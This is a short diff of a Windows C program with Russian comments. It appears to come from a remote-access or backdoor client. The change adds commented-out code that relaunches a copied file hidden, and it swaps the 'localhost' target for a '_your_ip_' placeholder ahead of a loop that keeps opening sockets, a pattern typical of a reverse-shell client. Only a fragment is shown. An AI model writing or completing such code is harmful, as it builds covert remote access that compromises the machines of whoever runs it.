@@ -49,9 +49,13 @@ void main() {
 			exit(0);
 		}
 	}
+	//else {
+	//	ShellExecuteA(NULL, "open", new_file, NULL, NULL, SW_HIDE);
+	//	exit(0);
+	//}
 
 	WSAStartup(MAKEWORD(2, 2), &wsadata);	//передача инфы по системе библиотеке/компилятору
-	getaddrinfo("localhost", PORT, &hints, &result);	//раб-ет как переводчик для сокетов (преобразование различных данных)
+	getaddrinfo("_your_ip_", PORT, &hints, &result);	//раб-ет как переводчик для сокетов (преобразование различных данных)
 
 	while (1) {
 		s = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
